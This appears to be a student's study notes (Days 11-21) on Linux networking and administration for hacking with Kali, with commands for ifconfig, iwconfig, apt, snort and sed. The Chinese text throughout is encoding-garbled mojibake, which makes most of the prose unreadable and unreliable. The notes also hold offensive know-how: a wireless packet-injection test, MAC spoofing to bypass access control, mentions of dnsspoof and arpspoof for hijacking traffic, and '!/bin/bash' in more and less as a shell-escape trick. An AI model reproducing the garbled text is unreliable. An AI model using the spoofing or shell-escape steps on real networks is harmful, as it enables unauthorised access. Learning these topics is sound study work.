  cp c* dir5/ 
  
  å¤åˆ¶ä¸€ä¸ªç›®å½• -a é€‰é¡¹ ç›¸å½“äº-dR
			   -R  é€’å½’
	cp -a dir1 dir9/
                         
10. Renaming a File æ–‡ä»¶é‡å‘½åæˆ–ç§»åŠ¨

	mv
	
11. Removing a File  åˆ é™¤æ–‡ä»¶
   rm  
12. Removing a Directory
	åˆ é™¤ç›®å½•
	rm -rf ç›®å½•
	    -f, --force          å¼ºåˆ¶åˆ é™¤
		-r, -R, --recursive   é€’å½’åˆ é™¤ç›®å½•åŠå…¶å†…å®¹
		-i                    æ¯æ¬¡åˆ é™¤å‰æç¤ºç¡®è®¤
### Day11

ç»ƒä¹ ï¼š



å¸¸ç”¨çš„æ–‡ä»¶ç±»å‹

l---è½¯é“¾æ¥ï¼ˆlinkï¼‰æ–‡ä»¶ï¼ˆç±»ä¼¼äºWindowsä¸­çš„å¿«æ·æ–¹å¼ï¼‰
d---ç›®å½•
-   æ™®é€šæ–‡ä»¶

Kaliä¸­å­—å…¸æ–‡ä»¶å­˜æ”¾ä½ç½® 
	/usr/share/wordlists 
	
åˆ†æå’Œç®¡ç†ç½‘ç»œ

11.1 Analyzing Networks with ifconfig
ä½¿ç”¨ifconfigæŸ¥çœ‹å’Œåˆ†æç½‘ç»œï¼ˆçŠ¶æ€ï¼‰

eth0 -ç¬¬ä¸€å—æœ‰çº¿ç½‘å¡
ensXX
em0

wlan0-ç¬¬ä¸€å—æ— çº¿ç½‘å¡

ifconfig -a
  -a  æŸ¥çœ‹æ‰€æœ‰çš„æ¥å£ï¼ˆåŒ…æ‹¬æ´»åŠ¨çš„å’Œä¸æ´»åŠ¨çš„ï¼‰
ifconfig eth0 down
	åœç”¨eth0è¿™å—ç½‘å¡
ifconfig eth0 up
	å¯ç”¨eth0è¿™å—ç½‘å¡


  
11.2 Checking Wireless Network Devices with iwconfig
ä½¿ç”¨iwconfigæ£€æŸ¥æ— çº¿è®¾å¤‡


11.3. ip address show //æŸ¥çœ‹IPåœ°å€
	  ip a
	  
11.4 Changing Your IP Address
æ›´æ”¹IPåœ°å€

1ï¼‰ä¸´æ—¶æ›´æ”¹

	1ï¼‰ifconfig eth0 192.168.195.66 
	//ä½¿ç”¨çš„æ˜¯é»˜è®¤å­ç½‘æ©ç 
	åœºæ™¯ï¼šæ’é”™ã€è°ƒè¯•ç½‘ç»œ
    2ï¼‰ifconfig eth0 10.1.1.1 netmask 255.255.255.0  
    //ä½¿ç”¨netmask æŒ‡å®šå­ç½‘æ©ç 	
	
	å®éªŒ
	ifconfig eth0 10.1.1.1
	ifconfig
	ifconfig eth0 10.1.1.1 netmask 255.255.255.0  
	ifconfig
Snagit


# ç¬”è®°ï¼ˆday012-day17)
### Day12
unicast  å•æ’­
Broadcast  å¹¿æ’­
multicast  ç»„æ’­
ç›®æ ‡MACåœ°å€ æºMACåœ°å€  ç±»å‹   Data   FCSï¼ˆå¸§æ ¡éªŒå’Œï¼‰

12.1 åœ¨Kaliä¸­å¦‚ä½•ä½¿ç”¨æ— çº¿ç½‘å¡è¿æ¥Wifi

Step1ï¼šå»ºè®®å…ˆåœ¨ä½ çš„ç¬”è®°æœ¬ä¸­å»ä½¿ç”¨è¿™ä¸ªæ— çº¿ç½‘å¡è¿æ¥Wifi

é©±åŠ¨ï¼šhttps://service.tp-link.com.cn/detail_download_1325.html

Step2: åœ¨è™šæ‹Ÿæœºä¸­æ·»åŠ USBæ§åˆ¶å™¨

æŠŠå®ƒè¿æ¥åˆ°è™šæ‹Ÿæœºä¸­

Step3: æŸ¥çœ‹ç½‘ç»œæ¥å£
ifconfig -a
å¦‚æœæ— çº¿ç½‘å¡æ²¡æœ‰upï¼Œä½¿ç”¨ifconfig wlan0 up å¯ç”¨æ— çº¿ç½‘å¡

Step4: ä½¿ç”¨iwconfigæ”¶é›†æ— çº¿ç½‘å¡çš„ä¿¡æ¯

iwconfig

è¿æ¥ä¸Šwifiçœ‹åˆ°çš„ç°è±¡
iwconfig
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0     IEEE 802.11  ESSID:"Xiaomi_20A8"  
          Mode:Managed  Frequency:2.437 GHz  Access Point: 88:C3:97:C2:F1:4E   
          Bit Rate=150 Mb/s   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:off
          Link Quality=70/70  Signal level=-36 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:16   Missed beacon:0		  
PSï¼šiwconfig
ï¼ˆ1ï¼‰IEEE 802.11 æ— çº¿ç½‘ç»œçš„æ ‡å‡†
	  802.11 a/b/g/n
	  	  802.11n æ”¯æŒ2.4GHZå’Œ5GHZ
	  ç†è®ºå¸¦å®½æœ€é«˜600Mpbs
ï¼ˆ2ï¼‰ESSIDå°±æ˜¯wifiçš„æ ‡è¯†
ï¼ˆ3ï¼‰Access Pointï¼ˆAPï¼Œæ— çº¿æ¥å…¥ç‚¹ï¼‰: æ— çº¿è·¯ç”±å™¨çš„MACåœ°å€
ï¼ˆ4ï¼‰Mode:Managed  æ— çº¿ç½‘å¡çš„æ¨¡å¼
		Managed--å®¢æˆ·ç«¯æ¨¡å¼ï¼Œè¿æ¥Wifié€šå¸¸ä½¿ç”¨çš„æ¨¡å¼
		Monitorï¼ˆç›‘è§†ï¼‰æˆ–promiscuousï¼ˆæ··æ‚ï¼‰ 
		åœ¨ç ´è§£æ— çº¿å¯†ç æ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨åˆ°æ··æ‚æ¨¡å¼(promiscuous mode)æˆ–Monitoræ¨¡å¼ï¼Œåœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œç½‘å¡å¤„äºå—…æ¢çŠ¶æ€ï¼ˆè¢«ç§°ä¸ºPassiveçŠ¶æ€ï¼Œè¢«åŠ¨çŠ¶æ€ï¼‰

Step5: è¿æ¥æŒ‡å®šçš„Wifi
	é€šè¿‡å›¾å½¢åŒ–çš„ç½‘ç»œç®¡ç†å™¨ï¼ˆæ¨èï¼‰ 
å‰æï¼šNetworkManageræœåŠ¡è¦å¼€å¯ï¼ˆæœåŠ¡åç§°åŒºåˆ†å¤§å°å†™ï¼‰
	systemctl status NetworkManager

12.2. åœ¨Kaliä¸­æŸ¥çœ‹ä½ çš„æ— çº¿ç½‘å¡æ˜¯å¦å¯ä»¥ç”¨äºæ— çº¿æ”»å‡»

1ï¼‰iw list  æŸ¥çœ‹æ— çº¿ç½‘å¡æ”¯æŒçš„æ¨¡å¼

 Supported interface modes:
                 * IBSS
                 * managed
                 * APï¼ˆæœ‰ï¼‰
                 * AP/VLAN
                 * monitorï¼ˆæœ‰ï¼‰
                 * mesh point
                 * P2P-client
                 * P2P-GO
                 * outside context of a BSS
2ï¼‰æŸ¥çœ‹æ˜¯å¦æ”¯æŒæ•°æ®åŒ…çš„æ³¨å…¥åŠŸèƒ½

aireplay-ng -9 wlan0

 Injectionï¼ˆæ³¨å…¥ï¼‰ is working!  ///


### Day13
13.1. Spoofing Your MAC Address
MACåœ°å€æ¬ºéª—

MACåœ°å€ï¼ˆç‰©ç†åœ°å€ï¼‰æ˜¯å…¨çƒå”¯ä¸€çš„ï¼Œ48ä½ï¼Œ16è¿›åˆ¶è¡¨ç¤º
E4-B9-7A-5A-5A-57
00:0c:29:76:ad:98
https://mac.bmcx.com/ï¼ˆMACåœ°å€æŸ¥è¯¢ï¼‰
ipconfig /all
ifconfig eth0

é˜²èŒƒï¼šé€šå¸¸è¢«ç”¨ä½œä¸€ç§å®‰å…¨æªæ–½ï¼Œä»¥é˜²æ­¢é»‘å®¢è¿›å…¥ç½‘ç»œâ€”â€”æˆ–è¿½è¸ªä»–ä»¬
æ”»å‡»ï¼šæ›´æ”¹MACåœ°å€æ¥ä¼ªè£…æˆä¸€ä¸ªä¸åŒçš„MACåœ°å€ä½¿å¾—ä¸Šè¿°å®‰å…¨æªæ–½æ— æ•ˆ
è¿™æ˜¯ä¸€é¡¹éå¸¸æœ‰ç”¨çš„ç»•è¿‡ç½‘ç»œè®¿é—®æ§åˆ¶æŠ€æœ¯ã€‚

ncpa.cpl--ç½‘ç»œè¿æ¥

arpåè®®--æŠŠIPåœ°å€è§£ææˆMACåœ°å€

arp -a  æŸ¥çœ‹ARPç¼“å­˜
arp -d  åˆ é™¤ARPç¼“å­˜
arp -d 192.168.195.149  //åˆ é™¤æŒ‡å®šçš„æ¡ç›®

æ›´æ”¹MACåœ°å€
æ–¹æ³•1ï¼šifconfig eth0 hw ether 00:0c:29:76:ad:99

æ–¹æ³•2ï¼š

macchanger -s eth0
  -s  æŸ¥çœ‹MACåœ°å€
macchanger eth0 -m  00:0c:29:76:ad:97  
	-m  è®¾ç½®æ–°çš„MACåœ°å€

13.2 Assigning New IP Addresses from the DHCP Server

é€šè¿‡DHCP æœåŠ¡å™¨è·å–IPåœ°å€

DHCPåè®®-åŠ¨æ€ä¸»æœºé…ç½®åè®®
Server : UDP/67
	Linuxä¸‹DHCPçš„æœåŠ¡ï¼ˆdaemon,åœ¨åå°è¿è¡Œï¼‰è¿›ç¨‹--dhcpd
Client : UDP/68



DHCP æœåŠ¡å™¨ä¸ºå­ç½‘ä¸Šçš„æ‰€æœ‰æœºå™¨åˆ†é… IP åœ°å€ï¼Œå¹¶åœ¨éšæ—¶ç»´æŠ¤å°† IP
åœ°å€åˆ†é…ç»™å“ªå°æœºå™¨çš„æ—¥å¿—æ–‡ä»¶ã€‚è¿™ä½¿å¾—å®ƒæˆä¸ºå–è¯åˆ†æäººå‘˜åœ¨æ”»å‡»åè¿½è¸ªé»‘å®¢çš„ç»ä½³èµ„æºã€‚å‡ºäºè¿™ä¸ªåŸå› ï¼Œäº†è§£ DHCP æœåŠ¡å™¨çš„å·¥ä½œåŸç†å¯¹ä¸€åé»‘å®¢å¾ˆæœ‰ç”¨ã€‚

Linuxä¸‹dhcpå®¢æˆ·ç«¯è°ƒè¯•å·¥å…· dhclient

-r  é‡Šæ”¾ï¼ˆreleaseï¼‰æ­£åœ¨ä½¿ç”¨çš„IPåœ°å€

dhclient eth0 -r

dhclient eth0 


### Day14

14.1. ç½‘ç»œå‚æ•°çš„é…ç½®

IPåœ°å€/æ©ç    ifconfig eth0  æˆ–  ip a
ç½‘å…³ï¼ˆé»˜è®¤-default è·¯ç”±ï¼‰ip route show ï¼ˆip rï¼‰
DNSï¼ˆnameserver ï¼Œåç§°æœåŠ¡å™¨ï¼‰  cat /etc/resolv.conf

192.168.X.Y

ï¼ˆ1ï¼‰æ‰‹å·¥æ–¹å¼
æ–¹æ³•1ï¼šå›¾å½¢åŒ–çš„ç½‘ç»œç®¡ç†å™¨

ä¾èµ–çš„æœåŠ¡ï¼šNetworkManager

Wired     æœ‰çº¿
Wireless  æ— çº¿


192.168.195.102/24
192.168.195.2
223.6.6.6

æ›´æ”¹ä¹‹å
 æŠŠå¯ç”¨è¿ç½‘ï¼ˆå¤é€‰æ¡†ï¼‰å–æ¶ˆå†é€‰ä¸­

æ–¹æ³•2ï¼šä¿®æ”¹ç½‘å¡çš„é…ç½®æ–‡ä»¶ï¼ˆæŒæ¡ï¼‰
Centosï¼ˆ/etc/sysconfig/network-scripts/ifcfg-**ï¼‰

/etc/network/interfaces

Step01: æŠŠNetworkManageræœåŠ¡å…³é—­å¹¶è®¾ç½®ä¸ºå¼€æœºä¸å¯åŠ¨

systemctl stop NetworkManager //å…³é—­
systemctl disable NetworkManager //ç¦ç”¨
systemctl status  NetworkManager //çŠ¶æ€

Step02: ç¼–è¾‘/etc/network/interfaces

PSï¼šæ¨èman interfaces

auto eth0    //å¯åŠ¨æ—¶æ¿€æ´»ç½‘å¡
iface eth0 inet static  //æ¥å£ä¸ºeth0,åœ°å€æŒ‡æ´¾æ–¹å¼ä¸ºé™æ€ï¼ˆstaticï¼Œæ‰‹å·¥æ–¹å¼ï¼‰
					    //dhcp
        address 192.168.195.76/24  //IPåœ°å€
        gateway 192.168.195.2      //ç½‘å…³
Step03 é‡å¯networkingæœåŠ¡
systemctl restart networking


14.2 DNSçš„ä¿®æ”¹ Changing Your DNS Server
/etc/resolv.conf
ä¿®æ”¹æ–¹æ³•1 viç›´æ¥ç¼–è¾‘
search qwfy.cn   //æœç´¢åŸŸ
nameserver 8.8.8.8  //DNSæœåŠ¡å™¨
nameserver
nameserver
ä¿®æ”¹æ–¹æ³•2****
echo "nameserver 223.6.6.6" >/etc/resolv.conf
ä¿®æ”¹æ–¹æ³•3
sed -i 's/nameserver 223.6.6.6/nameserver 8.8.8.8/' /etc/resolv.conf
sed æ˜¯éäº¤äº’å¼çš„æ–‡æœ¬ç¼–è¾‘å™¨
-i  å¯¹åŸå§‹æ–‡ä»¶å†…å®¹è¿›è¡Œä¿®æ”¹
's/old/new/'  æŸ¥æ‰¾æ›¿æ¢ï¼ŒæŠŠoldæ›¿æ¢æˆnew

### Day15

15.1. Manipulating the Domain Name System---ç»´æŠ¤DNS

é»‘å®¢å¯ä»¥ä½¿ç”¨DNSä»ç›®æ ‡å¤„æ”¶é›†ä¿¡æ¯

1ï¼‰åŒ…å«ç›®æ ‡åç§°æœåŠ¡å™¨ï¼ˆå°†ç›®æ ‡åç§°è½¬æ¢æˆ IP åœ°å€çš„æœåŠ¡å™¨ï¼‰çš„ IPåœ°å€ï¼ˆAè®°å½•ï¼‰
2ï¼‰ç›®æ ‡é‚®ä»¶æœåŠ¡å™¨ï¼ˆMXè®°å½•ï¼‰
3ï¼‰æ½œåœ¨çš„æ‰€æœ‰å­åŸŸåå’Œ IP åœ°å€

ï¼ˆ1ï¼‰Examining DNS with dig

1ï¼‰dig hackers-arise.com ns   
2ï¼‰dig hackers-arise.com mx
	å‘ç³»ç»Ÿé»˜è®¤çš„DNSæœåŠ¡å™¨æŸ¥è¯¢
3ï¼‰dig hackers-arise.com mx @223.6.6.6
	å‘æŒ‡å®šçš„DNSæœåŠ¡å™¨223.6.6.6æŸ¥è¯¢
4ï¼‰dig qq.com any @223.6.6.6     
	å‘æŒ‡å®šDNSæœåŠ¡å™¨æŸ¥è¯¢qq.comåŸŸä¸­ä»»æ„è®°å½•ç±»å‹
5ï¼‰ dig +noall +answer mail.163.com any


6ï¼‰dig +noall +answer -x 220.181.14.161
	-x åå‘æŸ¥è¯¢

ï¼ˆ2ï¼‰nslookup
nslookup qq.com -type=any 8.8.8.8
å‘æŒ‡å®šDNSæœåŠ¡å™¨æŸ¥è¯¢qq.comåŸŸä¸­ä»»æ„è®°å½•ç±»å‹


apt install dsniff


15.2. Mapping Your Own IP Addresses
      æ˜ å°„ä½ çš„IPåœ°å€
	Linux :/etc/hosts
	Windows: C:\Windows\System32\drivers\etc\hosts
	ä½œç”¨ï¼šå®Œæˆä¸»æœºååˆ°IPåœ°å€çš„æ˜ å°„
		  è§£æçš„ä¼˜å…ˆçº§ä¼šæ¯”DNSè¦é«˜
			1ï¼‰å±è”½ä¸€äº›ä¸è‰¯ç½‘ç«™
			2ï¼‰åŠ å¿«ä¸Šç½‘è®¿é—®çš„é€Ÿåº¦
			3ï¼‰é˜²æ­¢DNSåŠ«æŒï¼ˆDNSæ¬ºéª—ï¼‰
	æ ¼å¼ï¼š
	ä¸€è¡Œä»£è¡¨ä¸€æ¡è®°å½•
	IPåœ°å€   ä¸»æœºå1   ä¸»æœºå2  â€¦â€¦
	
	åˆ©ç”¨dnsspoofåŠ«æŒç”¨æˆ·çš„æµé‡

### Day16

å®‰è£…å’Œåˆ é™¤è½¯ä»¶ï¼ˆç¬¬å››ç« ï¼‰

add
remove
upgrade
query

16.1. Kali ç³»ç»Ÿ çš„æ›´æ–°

Step01:  æŸ¥çœ‹å‘è¡Œç‰ˆæœ¬

lsb_release -a    

Step02 æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬

uname -r


Step03  è½¯ä»¶ä»“åº“é…ç½®æ–‡ä»¶ï¼ˆä»¥.listç»“å°¾ï¼‰

è½¯ä»¶å­˜å‚¨åº“å­˜å‚¨åœ¨ /etc/apt/sources.list æ–‡ä»¶ä¸­ 

è¿˜å¯ä»¥æŠŠä¸€äº›è‡ªå®šä¹‰æˆ–å•ç‹¬çš„åº”ç”¨ç‹¬ç«‹é…ç½®ä¸€ä¸ªä»“åº“æ–‡ä»¶
å¾€å¾€æ”¾åœ¨/etc/apt/sources.list.d/ç›®å½•ä¸­ï¼Œä»¥.listç»“å°¾ï¼Œå¦‚
/etc/apt/sources.list.d/docker.list

Step04  æ›´æ–°å·¥å…·ï¼ˆå‘½ä»¤ï¼‰


apt-get å¯ä»¥ä»è®¤è¯è½¯ä»¶æºä¸‹è½½è½¯ä»¶åŒ…åŠç›¸å…³ä¿¡æ¯ï¼Œä»¥ä¾¿å®‰è£…å’Œå‡çº§è½¯ä»¶åŒ…ï¼Œ
æˆ–è€…ç”¨äºç§»é™¤è½¯ä»¶åŒ…ï¼Œç±»ä¼¼äºCentosä¸­çš„yum

1.apt-get update  æ›´æ–°è½¯ä»¶åŒ…çš„åˆ—è¡¨ï¼ˆç´¢å¼•ï¼‰
  è§£å†³æ›´æ–°è½¯ä»¶åŒ…åˆ—è¡¨å¤±è´¥ï¼šapt-get update --fix-missing
2.apt-get upgrade   æ›´æ–°è½¯ä»¶åŒ…
3.apt-get dist-upgrade  å°†ç³»ç»Ÿå‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬
4.apt-get clean    //æ¸…é™¤æ›´æ–°ç—•è¿¹//å¯é€‰


### Day17

Advanced Packaging Tool, or apt
ä¸»è¦çš„å‘½ä»¤å°±æ˜¯apt-get 
é€šè¿‡è½¯ä»¶ä»“åº“å®ç°å¯¹è½¯ä»¶åŒ…çš„ç®¡ç†ï¼Œå¯ä»¥å¾ˆå¥½åœ°è§£å†³è½¯ä»¶åŒ…ä¹‹é—´çš„ç›¸äº’ä¾èµ–å…³ç³»

17.1. Searching for a Packageï¼ˆæœç´¢è½¯ä»¶åŒ…ï¼‰

apt-cache å¯ä»¥æŸ¥è¯¢å’Œæ˜¾ç¤ºå·²å®‰è£…å’Œå¯å®‰è£…è½¯ä»¶åŒ…çš„å¯ç”¨ä¿¡æ¯ã€‚
å®ƒä¸“é—¨å·¥ä½œåœ¨æœ¬åœ°çš„æ•°æ®ç¼“å­˜ä¸Šï¼Œè€Œè¿™äº›ç¼“å­˜å¯ä»¥é€šè¿‡æ¯”å¦‚
apt-get çš„ 'update' å‘½ä»¤æ¥æ›´æ–°
å¸¸ç”¨çš„å‘½ä»¤é€‰é¡¹
  search - æ ¹æ®æ­£åˆ™è¡¨è¾¾å¼æœç´¢è½¯ä»¶åŒ…åˆ—è¡¨
  show - ä»¥ä¾¿äºé˜…è¯»çš„æ ¼å¼ä»‹ç»è¯¥è½¯ä»¶åŒ…


apt-cache search å…³é”®å­—

vsftpd---FTPæœåŠ¡è½¯ä»¶

apt-cache search vsftpd
apt-cache search ^vsftpd

Debiançš„è½¯ä»¶åŒ…æ ¼å¼  *.debï¼ˆç®¡ç†å·¥å…·æ˜¯dpkgï¼‰
dpkg - package manager for Debian
			-i  å®‰è£…
			-r  åˆ é™¤
			-l  æŸ¥çœ‹
			-L åˆ—å‡ºå±äºæŒ‡å®šè½¯ä»¶åŒ…çš„æ–‡ä»¶
Centosã€RedHatçš„è½¯ä»¶åŒ…æ ¼å¼ *.rpmï¼ˆç®¡ç†å·¥å…·æ˜¯rpmï¼‰

ç›¸å…³å•è¯
	Depends  ä¾èµ–

17.2. å®‰è£…è½¯ä»¶

apt-get install è½¯ä»¶åŒ…å

apt-get install vsftpd  

17.3 åˆ é™¤è½¯ä»¶åŒ… removing Software  
apt-get remove è½¯ä»¶åŒ…å

apt-get purge  è½¯ä»¶åŒ…å
	 remove - å¸è½½è½¯ä»¶åŒ…
     purge - å¸è½½å¹¶æ¸…é™¤è½¯ä»¶åŒ…çš„é…ç½®
	 
17.4. apt-file

apt-fileå¯ä»¥æ ¹æ®å‘½ä»¤æœç´¢è½¯ä»¶åŒ…

Step0: apt-get install apt-file

Step1ï¼šæ›´æ–°ç¼“å­˜
	apt-file update
Step2:
apt-file search arpspoof
//æœç´¢arpspoofå‘½ä»¤ç”±å“ªä¸ªè½¯ä»¶åŒ…æä¾›
PSï¼šarpspoof ï¼Œarpæ¬ºéª—çš„å·¥å…·


  








# ç¬”è®°ï¼ˆdaty18-day24)
### Day18
apt-get update å–å›æ›´æ–°çš„è½¯ä»¶åŒ…åˆ—è¡¨
apt-get upgrade è½¯ä»¶åŒ…  //å‡çº§
apt-get install è½¯ä»¶åŒ…  //å®‰è£…
apt-get remove  è½¯ä»¶åŒ…  //åˆ é™¤

æ¡ˆä¾‹1
tree---æ˜¾ç¤ºç›®å½•æ ‘
1ï¼‰apt-get install tree 
2ï¼‰tree -L 1 work
    -L  æŒ‡å®šç›®å½•çº§åˆ«
	
æ¡ˆä¾‹2 
ä½¿ç”¨dpkgå®‰è£…è½¯ä»¶åŒ…
apt-get remove tree
cd work/doc
apt-get download tree
 //download - ä¸‹è½½æŒ‡å®šçš„äºŒè¿›åˆ¶åŒ…åˆ°å½“å‰ç›®å½•
ls -lh 
dpkg -i tree_1.8.0-1+b1_amd64.deb
which tree
tree -L 1 / 

æ¡ˆä¾‹3 æœ¬åœ°è½¯ä»¶åŒ…å®‰è£…  dpkg -i
					  apt-get install -f

å®‰è£…ä¸€ä¸ªé›†æˆçš„å¼€å‘ç¯å¢ƒï¼ˆIDEï¼‰ï¼šVisual Studio Code

https://code.visualstudio.com/download/

wget  https://az764295.vo.msecnd.net/stable/83bd43bc519d15e50c4272c6cf5c1479df196a4d/code_1.60.1-1631294805_amd64.deb

dpkg -i  code_1.60.1-1631294805_amd64.deb 
apt-get install -f ./code_1.60.1-1631294805_amd64.deb  //è‡ªåŠ¨è§£å†³å®‰è£…è¿‡ç¨‹ä¸­çš„ä¾èµ–å…³ç³»

æ¡ˆä¾‹4ï¼š å®‰è£…mtr  å›¾å½¢åŒ–è·¯ç”±è·Ÿè¸ªå·¥å…·
Full screen ncurses and X11 traceroute tool

Windows--tracert
Linux--traceroute

1ï¼‰apt-cache search ^mtr

2ï¼‰apt-get install mtr
3ï¼‰mtr www.qq.com

æ¡ˆä¾‹5ï¼š å‡çº§è½¯ä»¶åŒ…
python3çš„å‡çº§

python3 -V

apt-get upgrade python3

python3 -V

æ¡ˆä¾‹6ï¼š é€šè¿‡gitæ–¹å¼å®‰è£…è½¯ä»¶
Installing Software with git
git clone 
ä»æŒ‡å®šçš„ä»“åº“åœ°å€æŠŠè½¯ä»¶ä»£ç ä¸‹è½½ï¼ˆå…‹éš†,cloneï¼‰åˆ°æœ¬åœ°
recon-ng--å¼€æºçš„æƒ…æŠ¥æœé›†å·¥å…·
git clone https://github.com/lanmaster53/recon-ng.git

ä½œä¸š
meld--æ–‡ä»¶å·®å¼‚æ¯”è¾ƒå·¥å…·

### Day19
19.1 æ–‡æœ¬å¤„ç†
ä¸€åˆ‡çš†æ–‡ä»¶

snort,NIDSï¼ˆç½‘ç»œå…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼‰,ç°åœ¨è¢«æ€ç§‘ï¼ˆCiscoï¼‰æ”¶è´­
flexible Network Intrusion Detection System
https://www.snort.org/

æ¡ˆä¾‹ï¼šsnortçš„é…ç½®æ–‡ä»¶çš„å¤„ç†

Step1: å®‰è£…snort

 apt-get install snort snort-doc  
 
 dpkg -l | grep snort
Step2: æ‰¾åˆ°å…¶é…ç½®æ–‡ä»¶ /etc/snort/snort.conf

Step3:  æŸ¥çœ‹æ–‡ä»¶ Viewing Files

ï¼ˆ1ï¼‰cat  é€‚åˆæŸ¥çœ‹å°æ–‡ä»¶

 cat /etc/snort/snort.conf
 
ï¼ˆ2ï¼‰head  æŸ¥çœ‹æ–‡ä»¶çš„å¤´éƒ¨
 é»˜è®¤æ˜¾ç¤ºæ–‡ä»¶çš„å‰10è¡Œ
 
 head /etc/snort/snort.conf
 head -20  /etc/snort/snort.conf  //æ˜¾ç¤ºæ–‡ä»¶çš„å‰20è¡Œ
 
 ï¼ˆ3ï¼‰æ˜¾ç¤ºæ–‡ä»¶çš„å°¾éƒ¨
 tail
é»˜è®¤æ˜¾ç¤ºæ–‡ä»¶çš„å10è¡Œ
	  -f,          éšæ–‡ä»¶å¢é•¿å³æ—¶è¾“å‡ºæ–°å¢æ•°æ®ï¼›ï¼ˆç”¨äºç›‘è§†ä¸€ä¸ªæ–‡ä»¶çš„å˜åŒ–ï¼‰
tail +20 number.txt | more  ä»ç¬¬20è¡Œå¼€å§‹æ˜¾ç¤º
tail -20 number.txt æ˜¾ç¤ºå°¾éƒ¨çš„å20è¡Œ

ï¼ˆ4ï¼‰Numbering the Linesï¼Œnl
  æ˜¾ç¤ºæ–‡ä»¶çš„è¡Œå·ï¼šä¸ç»™ç©ºè¡ŒåŠ è¡Œå·

nl /etc/snort/snort.conf ==cat -b  /etc/snort/snort.conf
wc -l /etc/snort/snort.conf  //ç»Ÿè®¡æ–‡ä»¶çš„è¡Œæ•°
cat -n /etc/snort/snort.conf  ï¼ˆç©ºè¡Œä¹Ÿè¿›è¡Œç¼–å·ï¼‰

ï¼ˆ5ï¼‰Filtering Text with grep
ä½¿ç”¨grepåšæ–‡æœ¬è¿‡æ»¤
cat /etc/snort/snort.conf | grep output


ï¼ˆ6ï¼‰æŒ‘æˆ˜
cat -n /etc/snort/snort.conf  | grep output

cat -n /etc/snort/snort.conf  | head -544 | tail -9

cat -n /etc/snort/snort.conf  | sed -n '538,544p'

ï¼ˆ7ï¼‰æŒ‘æˆ˜2

åªæŸ¥çœ‹number.txtæ–‡ä»¶ï¼ˆå…±100è¡Œï¼‰å†…ç¬¬20åˆ°ç¬¬30è¡Œçš„å†…å®¹
seq  1 100 > number.txt
æ–¹æ³•1ï¼š
head -30 number.txt | tail -11

æ–¹æ³•2ï¼š
tail +20 number.txt | head -11
tail -81 number.txt | head -11

æ–¹æ³•3ï¼šsed -n '20,30p' number.txt 


### Day20
æ–‡æœ¬ä¸‰å‰‘å®¢
grep è¿‡æ»¤
sed  ç¼–è¾‘
awk  æˆªå–
20.1. Using sed to Find and Replace
sed--éäº¤äº’å¼ æµ ç¼–è¾‘å™¨
ä½¿ç”¨sedæŸ¥æ‰¾å’Œæ›¿æ¢
sedä¸­çš„å‘½ä»¤ï¼š
1ï¼‰s ---æ›¿æ¢
      g--å…¨å±€æ›¿æ¢
	  æ•°å­—n--æ›¿æ¢ç¬¬næ¬¡å‡ºç°çš„å­—ç¬¦
	  é’ˆå¯¹çš„æ˜¯ä¸€è¡Œä¸­å‡ºç°å¤šä¸ªè¦æ›¿æ¢çš„å­—ç¬¦

s/old/new/  ç”¨newæ›¿æ¢æˆold

cat /etc/snort/snort.conf | grep mysql | sed 's/mysql/MYSQL/'

echo "Hi, xiaofeixia, I am be xiaofeixia" | sed 's#xiaofeixia#xiaoxiao#g'

echo "Hi, xiaofeixia, I am be xiaofeixia,you not xiaofeixia" | sed 's#xiaofeixia#xiaoxiao#2'



20.2. Viewing Files with more and less
ä½¿ç”¨moreå’ŒlessæŸ¥çœ‹æ–‡ä»¶ï¼ˆåˆ†å±æŸ¥çœ‹ï¼‰
å¸¸ç»“åˆç®¡é“ç¬¦ä½¿ç”¨

ï¼ˆ1ï¼‰more
å›è½¦--å‘ä¸‹æ˜¾ç¤ºä¸€è¡Œ
ç©ºæ ¼--å‘ä¸‹æ˜¾ç¤ºä¸€å±
Pageup--å‘ä¸Šç¿»é¡µ
Pagedown--å‘ä¸‹ç¿»é¡µ
q é€€å‡º
/å…³é”®å­—  æŒ‰å…³é”®å­—æŸ¥æ‰¾ï¼ˆæ‰¾åˆ°ä¹‹åç»§ç»­æŸ¥æ‰¾ï¼Œå¯ä»¥ä½¿ç”¨n
!å‘½ä»¤  è°ƒç”¨å‘½ä»¤æ‰§è¡Œ
!/bin/bash è°ƒç”¨äº†ä¸€ä¸ªshellæ‰§è¡Œï¼Œï¼ˆä¼šç”¨è¿™ç§æ–¹æ³•è¿›è¡Œshellé€ƒé€¸ï¼‰
v è¿›å…¥viæ¨¡å¼å¯¹æ–‡ä»¶è¿›è¡Œç¼–è¾‘

ï¼ˆ2ï¼‰less
Less is more
-N  æ‰“å¼€æ–‡ä»¶æ—¶ç›´æ¥æ˜¾ç¤ºè¡Œå·

å…‰æ ‡çš„å¿«é€Ÿç§»åŠ¨
gg  ç¬¬ä¸€è¡Œ
G   æœ€åä¸€è¡Œ

!å‘½ä»¤  è°ƒç”¨å‘½ä»¤æ‰§è¡Œï¼ˆ!ls /rootï¼‰
!/bin/bash è°ƒç”¨äº†ä¸€ä¸ªshellæ‰§è¡Œï¼Œï¼ˆä¼šç”¨è¿™ç§æ–¹æ³•è¿›è¡Œshellé€ƒé€¸ï¼‰


ï¼ˆ3ï¼‰ç»ƒä¹ 

/usr/share/wordlists ---Kaliä¸­å¸¸ç”¨çš„ï¼ˆå£ä»¤ï¼‰å­—å…¸æ–‡ä»¶çš„ä½ç½®
/usr/share/wordlists/metasploit
metasploit---æœ€æµè¡Œçš„æ¼æ´åˆ©ç”¨æ¡†æ¶



### Day21
æ–‡æœ¬å¤„ç†å°æŒ‘æˆ˜ --
21.1 sort--æ’åº
